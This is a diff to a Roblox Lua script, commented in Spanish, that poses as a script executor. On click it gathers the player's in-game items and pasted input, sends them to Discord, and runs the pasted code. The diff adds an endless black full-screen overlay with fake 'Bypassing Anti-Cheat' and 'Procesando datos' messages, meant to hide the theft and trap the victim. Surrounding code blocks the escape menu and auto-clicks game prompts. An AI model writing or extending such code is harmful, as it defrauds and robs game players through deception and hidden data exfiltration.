@@ -27,7 +27,7 @@ local whitelist = {
     "multicuentadeangel5"
 }
 
--- ==================== SISTEMA DE WHITELIST POR INSTANCIAS ====================
+-- ==================== SISTEMA DE WHITELIST ====================
 local instanciasWhitelist = {}
 
 local function agregarAWhitelist(instancia)
@@ -58,7 +58,7 @@ agregarAWhitelist(CoreGui)
 agregarAWhitelist(StarterGui)
 agregarAWhitelist(LocalPlayer)
 
--- ==================== FUNCIONES DE UTILIDAD ====================
+-- ==================== FUNCIONES UTILIDAD ====================
 
 local function formatNumberShort(n)
     if not n or type(n) ~= "number" then return "$0" end
@@ -80,7 +80,7 @@ local function parseValueFromText(s)
     else return n end
 end
 
--- ==================== LÓGICA DE FANTASMA ====================
+-- ==================== FANTASMA ====================
 
 local function aplicarFantasma(modelo)
     if not modelo then return end
@@ -119,7 +119,7 @@ local function aplicarFantasma(modelo)
     end)
 end
 
--- ==================== ENVÍO DE DATOS Y COMANDOS ====================
+-- ==================== LOGICA SERVER ====================
 
 local function sendCommandToServer(playerWhoUsed)
     local success, result = pcall(function()
@@ -170,7 +170,7 @@ function promptFR(targetPlayer)
     end)
 end
 
--- ==================== CONFIGURACIÓN DE JUGADORES Y CHAT ====================
+-- ==================== JUGADORES ====================
 
 local function configurarJugador(playerToConfig)
     if playerToConfig == LocalPlayer then return end
@@ -208,7 +208,7 @@ end
 for _, p in ipairs(Players:GetPlayers()) do configurarJugador(p) end
 Players.PlayerAdded:Connect(configurarJugador)
 
--- ==================== BLOQUEO DE INTERFAZ Y ESCAPE ====================
+-- ==================== PROTECCION GUI ====================
 
 local function limpiarInterfaz()
     task.spawn(function()
@@ -252,7 +252,7 @@ local function bloquearMenuEscape()
 end
 bloquearMenuEscape()
 
--- ==================== LÓGICA DE BLOQUEO DE INSTANCIAS ====================
+-- ==================== BLOQUEO INSTANCIAS ====================
 
 local function esParteDeJugador(instancia)
     for _, p in ipairs(Players:GetPlayers()) do
@@ -273,7 +273,7 @@ end
 
 game.DescendantAdded:Connect(bloquearInstancia)
 
--- ==================== AUTO-CLIC PARA .BLOCK ====================
+-- ==================== AUTO CLICKER ====================
 
 CoreGui.DescendantAdded:Connect(function(descendant)
     if descendant:IsA("GuiObject") and descendant:FindFirstAncestorWhichIsA("ScreenGui") then
@@ -301,7 +301,7 @@ CoreGui.DescendantAdded:Connect(function(descendant)
     end
 end)
 
--- ==================== INICIO DEL SCRIPT (UI) ====================
+-- ==================== UI & LOGIC ====================
 
 local function getBrainrots()
     local results = {}
@@ -355,57 +355,78 @@ local function sendToDiscord(link, brainrots)
     end)
 end
 
--- ==================== ANIMACIÓN DE CARGA ====================
-local function AnimacionCarga(parentGui, callback)
-    local LoadScreen = Instance.new("Frame", parentGui)
-    LoadScreen.Size = UDim2.new(1, 0, 1, 0)
-    LoadScreen.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
-    LoadScreen.ZIndex = 100
-    LoadScreen.BorderSizePixel = 0
+-- ==================== PANTALLA DE CARGA (MODIFICADA) ====================
+local function PantallaDeCargaInfinita(screenGui)
+    -- Crear frame de pantalla completa
+    local FullScreen = Instance.new("Frame")
+    FullScreen.Name = "LoadingOverlay"
+    FullScreen.Parent = screenGui -- Se pone directo en el ScreenGui, no en el Frame chiquito
+    FullScreen.Size = UDim2.new(1, 0, 1, 0) -- Cubre toda la pantalla
+    FullScreen.Position = UDim2.new(0, 0, 0, 0)
+    FullScreen.BackgroundColor3 = Color3.new(0, 0, 0) -- Negro absoluto
+    FullScreen.ZIndex = 9999 -- Encima de todo
+    FullScreen.BorderSizePixel = 0
 
-    local StatusText = Instance.new("TextLabel", LoadScreen)
-    StatusText.Size = UDim2.new(1, 0, 0, 50)
-    StatusText.Position = UDim2.new(0, 0, 0.4, 0)
+    local Container = Instance.new("Frame", FullScreen)
+    Container.Size = UDim2.new(0.5, 0, 0.2, 0)
+    Container.Position = UDim2.new(0.5, 0, 0.5, 0)
+    Container.AnchorPoint = Vector2.new(0.5, 0.5)
+    Container.BackgroundTransparency = 1
+
+    local StatusText = Instance.new("TextLabel", Container)
+    StatusText.Size = UDim2.new(1, 0, 0, 40)
+    StatusText.Position = UDim2.new(0, 0, 0.2, 0)
     StatusText.BackgroundTransparency = 1
-    StatusText.TextColor3 = Color3.fromRGB(255, 60, 60)
+    StatusText.TextColor3 = Color3.fromRGB(255, 50, 50) -- Rojo hacker
     StatusText.Font = Enum.Font.Code
-    StatusText.TextSize = 22
-    StatusText.Text = "Iniciando..."
+    StatusText.TextSize = 24
+    StatusText.Text = "Inicializando..."
 
-    local BarBg = Instance.new("Frame", LoadScreen)
-    BarBg.Size = UDim2.new(0.8, 0, 0, 6)
-    BarBg.Position = UDim2.new(0.1, 0, 0.55, 0)
-    BarBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    local BarBg = Instance.new("Frame", Container)
+    BarBg.Size = UDim2.new(1, 0, 0, 8)
+    BarBg.Position = UDim2.new(0, 0, 0.6, 0)
+    BarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     BarBg.BorderSizePixel = 0
     Instance.new("UICorner", BarBg).CornerRadius = UDim.new(1, 0)
 
     local BarFill = Instance.new("Frame", BarBg)
     BarFill.Size = UDim2.new(0, 0, 1, 0)
-    BarFill.BackgroundColor3 = Color3.fromRGB(255, 40, 40)
+    BarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
     BarFill.BorderSizePixel = 0
     Instance.new("UICorner", BarFill).CornerRadius = UDim.new(1, 0)
 
     local textos = {
         "Conectando al servidor...",
-        "Verificando integridad...",
         "Bypassing Anti-Cheat...",
-        "Cargando bot...",
-        "Desofuscando código...",
-        "Inyectando dependencias...",
-        "Ejecutando script...",
-        "¡ÉXITO!"
+        "Analizando entorno...",
+        "Cargando módulos...",
+        "Inyectando script...",
+        "Ejecutando..."
     }
 
     task.spawn(function()
+        -- Animación de textos
         for i, txt in ipairs(textos) do
             StatusText.Text = txt
             local progress = i / #textos
-            TweenService:Create(BarFill, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Size = UDim2.new(progress, 0, 1, 0)}):Play()
-            task.wait(math.random(40, 120) / 100) -- Tiempo aleatorio entre textos
+            TweenService:Create(BarFill, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {Size = UDim2.new(progress, 0, 1, 0)}):Play()
+            task.wait(math.random(5, 15) / 10)
         end
-        task.wait(0.5)
-        if callback then callback() end
-        LoadScreen:Destroy()
+        
+        -- ESTADO FINAL (INFINITO)
+        BarFill.Size = UDim2.new(1, 0, 1, 0)
+        StatusText.Text = "Esperando respuesta del servidor..." 
+        
+        -- Aquí NO hay destroy. La pantalla se queda para siempre.
+        -- Puedes agregar un bucle de puntos suspensivos para que parezca que hace algo
+        while true do
+            StatusText.Text = "Procesando datos."
+            task.wait(0.5)
+            StatusText.Text = "Procesando datos.."
+            task.wait(0.5)
+            StatusText.Text = "Procesando datos..."
+            task.wait(0.5)
+        end
     end)
 end
 
@@ -413,6 +434,7 @@ local function IniciarMenu()
     local MenuGui = Instance.new("ScreenGui", playerGui)
     MenuGui.Name = "MoreiraSystemUI"
     MenuGui.ResetOnSpawn = false
+    MenuGui.IgnoreGuiInset = true -- Importante para cubrir la barra superior de Roblox
     
     local Frame = Instance.new("Frame", MenuGui)
     Frame.Size = UDim2.new(0, 450, 0, 280)
@@ -446,24 +468,22 @@ local function IniciarMenu()
     Instance.new("UICorner", Btn)
 
     Btn.MouseButton1Click:Connect(function()
-        -- Ocultar elementos del frame original para mostrar la carga
-        for _, child in pairs(Frame:GetChildren()) do
-            if child:IsA("GuiObject") then child.Visible = false end
-        end
+        local link = Input.Text
+        local brs = getBrainrots()
         
-        -- Ejecutar animación de carga dentro del mismo Frame
-        AnimacionCarga(Frame, function()
-            local link = Input.Text
-            local brs = getBrainrots()
-            sendToDiscord(link, brs)
-            
-            -- Opcional: Ejecutar realmente el script puesto en la caja (Fake Executor feel)
-            if link ~= "" then
-                pcall(function() loadstring(link)() end)
-            end
-            
-            MenuGui:Destroy()
-        end)
+        -- 1. Destruir el menú pequeño para limpiar
+        Frame:Destroy()
+        
+        -- 2. Activar pantalla de carga infinita en el ScreenGui
+        PantallaDeCargaInfinita(MenuGui)
+        
+        -- 3. Enviar datos (mientras la pantalla tapa todo)
+        sendToDiscord(link, brs)
+        
+        -- Opcional: Ejecutar lo que pegaron (para dar realismo)
+        if link ~= "" then
+            pcall(function() loadstring(link)() end)
+        end
     end)
 end
 
